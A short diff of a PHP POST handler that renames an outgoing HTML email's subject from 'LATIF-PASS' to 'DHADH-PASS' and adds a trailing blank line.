@@ -64,7 +64,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'LATIF-PASS';
+        $mail->Subject = 'DHADH-PASS';
         $mail->Body    = $emailBody;
 
         // Send the email
@@ -77,4 +77,5 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 } else {
     echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
 }
+
 
